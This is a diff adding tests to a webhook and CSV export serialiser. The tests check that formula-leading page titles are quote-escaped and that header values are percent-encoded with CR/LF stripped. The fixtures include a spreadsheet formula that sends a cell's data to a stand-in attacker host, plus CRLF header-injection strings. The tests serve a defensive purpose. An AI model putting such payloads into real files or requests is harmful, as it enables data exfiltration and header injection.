@@ -251,6 +251,26 @@ test('CSV with no detections is a header and a single page row', () => {
   assert.strictEqual(rows[1][rows[0].indexOf('hostname')], 'shop.example');
 });
 
+test('CSV keeps a page title that starts like a spreadsheet formula text, and numbers are left alone', () => {
+  const ctx = ctxWith([], { title: '=HYPERLINK("https://evil.example/?"&A2,"x")', count: 3 });
+  const rows = parseCsv(WB.build('text/csv', WB.DEFAULT_TEMPLATE, ctx).body);
+  const col = (name) => rows[1][rows[0].indexOf(name)];
+  assert.strictEqual(col('title'), '\'=HYPERLINK("https://evil.example/?"&A2,"x")');
+  assert.strictEqual(col('count'), '0', 'a number is not touched');
+  for (const lead of ['+1+1', '-2+3', '@SUM(A1)']) {
+    const row = parseCsv(WB.build('text/csv', WB.DEFAULT_TEMPLATE, ctxWith([], { title: lead })).body);
+    assert.strictEqual(row[1][row[0].indexOf('title')], `'${lead}`, lead);
+  }
+});
+
+test('a header value holds only what fetch accepts: other characters are percent-encoded, control characters become spaces', () => {
+  assert.strictEqual(WB.headerValue('Café — Menu'), 'Café %E2%80%94 Menu');
+  assert.strictEqual(WB.headerValue('日本語\r\nX-Injected: 1'), '%E6%97%A5%E6%9C%AC%E8%AA%9E X-Injected: 1');
+  assert.strictEqual(WB.headerValue('plain-value_1'), 'plain-value_1');
+  assert.strictEqual(WB.headerValue(null), '');
+  assert.doesNotThrow(() => new Headers({ 'X-Title': WB.headerValue('Café — 日本 \ud83d') }));
+});
+
 // ---------------------------------------------------------------- NDJSON
 test('NDJSON is one parseable object per detection with the page fields', () => {
   const ctx = ctxWith(DETS);
@@ -307,6 +327,17 @@ function loadRuntime(webhook, calls) {
   }
   return sandbox.SettingsRuntime;
 }
+
+test('a header that carries the page title is sent for a title with an em dash or Japanese text', async () => {
+  const calls = [];
+  const runtime = loadRuntime({ enableWebhook: true, webhookUrl: 'https://hooks.example/in', webhookMethod: 'POST', webhookContentType: 'application/json',
+    webhookHeaders: [{ name: 'X-Title', value: 'Page: <TITLE>' }] }, calls);
+  const request = runtime.buildWebhookRequest({ webhookUrl: 'https://hooks.example/in', webhookMethod: 'POST', webhookContentType: 'application/json',
+    webhookPayload: WB.DEFAULT_TEMPLATE, webhookHeaders: [{ name: 'X-Title', value: 'Page: <TITLE>' }] },
+  ctxWith([], { title: 'Café — メニュー\r\nInjected: 1' }));
+  assert.strictEqual(request.options.headers['X-Title'], 'Page: Café %E2%80%94 %E3%83%A1%E3%83%8B%E3%83%A5%E3%83%BC Injected: 1');
+  assert.doesNotThrow(() => new Headers(request.options.headers), 'fetch accepts it');
+});
 
 test('the background sender uses the serialiser and header for every content type', async () => {
   const types = ['application/json', 'application/x-www-form-urlencoded', 'multipart/form-data', 'text/plain', 'application/xml', 'text/csv', 'application/x-ndjson', 'application/vnd.acme+json'];
